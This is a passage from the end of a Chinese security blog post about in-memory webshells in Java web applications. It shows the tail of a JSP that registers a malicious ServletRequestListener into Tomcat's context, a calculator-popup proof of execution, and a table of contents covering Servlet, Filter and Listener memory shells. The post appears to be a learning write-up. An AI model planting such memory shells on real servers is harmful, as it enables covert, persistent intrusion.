class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br><br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//添加监听器</span><br>    standardContext.addApplicationEventListener(servletRequestListener);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>然后美美白屏弹计算器</p>
<p><img src="https://cdn.clown2024.cn/202409191342329.png" alt="image-20240919134253239"></p>
<p><img src="https://cdn.clown2024.cn/202409191342142.png" alt="image-20240919134258008"></p>
<blockquote>
<p>这里我认为是并没有相关路径的匹配逻辑，所以不需要在访问前的那部分注册</p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://clowsman.github.io">clown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://clowsman.github.io/2024/09/14/传统web应用型内存马/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://clowsman.github.io" target="_blank">clown</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java/">java</a><a class="post-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div><div class="post_share"><div class="social-share" data-image="http://cdn.clown2024.cn/202407151814129.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Mysql-JDBC反序列化"><img class="cover" src="http://cdn.clown2024.cn/202407151814112.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Mysql-JDBC反序列化</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat中间件内存马"><img class="cover" src="http://cdn.clown2024.cn/202407151814125.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Tomcat中间件内存马</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/" title="Java Agent学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814114.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-30</div><div class="title">Java Agent学习</div></div></a></div><div><a href="/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat中间件内存马"><img class="cover" src="http://cdn.clown2024.cn/202407151814125.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-14</div><div class="title">Tomcat中间件内存马</div></div></a></div><div><a href="/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/" title="ASM学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814125.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-10</div><div class="title">ASM学习</div></div></a></div><div><a href="/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/" title="C3P0利用链学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814123.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-01</div><div class="title">C3P0利用链学习</div></div></a></div><div><a href="/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" title="JDK17反射限制绕过学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814112.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-29</div><div class="title">JDK17反射限制绕过学习</div></div></a></div><div><a href="/2024/11/18/DASCtf-easyjob/" title="DASCtf-easyjob"><img class="cover" src="http://cdn.clown2024.cn/202407151814130.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-18</div><div class="title">DASCtf-easyjob</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://cdn.clown2024.cn/202407151818951.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">clown</div><div class="author-info__description">又菜又爱玩</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">77</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">31</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/clowsman"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/clowsman" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#servlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">Servlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95demo"><span class="toc-number">1.1.</span> <span class="toc-text">简单demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">原理分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">Filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99"><span class="toc-number">2.2.</span> <span class="toc-text">内存马编写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#listener%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">Listener内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99"><span class="toc-number">3.2.</span> <span class="toc-text">内存马编写</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/" title="红日靶场五"><img src="http://cdn.clown2024.cn/202407151814112.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场五"/></a><div class="content"><a class="title" href="/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/" title="红日靶场五">红日靶场五</a><time datetime="2024-11-20T17:01:38.000Z" title="发表于 2024-11-21 01:01:38">2024-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/18/DASCtf-easyjob/" title="DASCtf-easyjob"><img src="http://cdn.clown2024.cn/202407151814130.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCtf-easyjob"/></a><div class="content"><a class="title" href="/2024/11/18/DASCtf-easyjob/" title="DASCtf-easyjob">DASCtf-easyjob</a><time datetime="2024-11-18T11:57:35.000Z" title="发表于 2024-11-18 19:57:35">2024-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四"><img src="http://cdn.clown2024.cn/202407151814115.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场四"/></a><div class="content"><a class="title" href="/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四">红日靶场四</a><time datetime="2024-11-15T14:00:56.000Z" title="发表于 2024-11-15 22:00:56">2024-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/" title="红日靶场三"><img src="http://cdn.clown2024.cn/202407151814125.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场三"/></a><div class="content"><a class="title" href="/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/" title="红日靶场三">红日靶场三</a><time datetime="2024-11-14T15:16:59.000Z" title="发表于 2024-11-14 23:16:59">2024-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" title="Spring内存马学习"><img src="http://cdn.clown2024.cn/202407151814112.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring内存马学习"/></a><div class="content"><a class="title" href="/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" title="Spring内存马学习">Spring内存马学习</a><time datetime="2024-11-13T03:17:56.000Z" title="发表于 2024-11-13 11:17:56">2024-11-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By clown</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>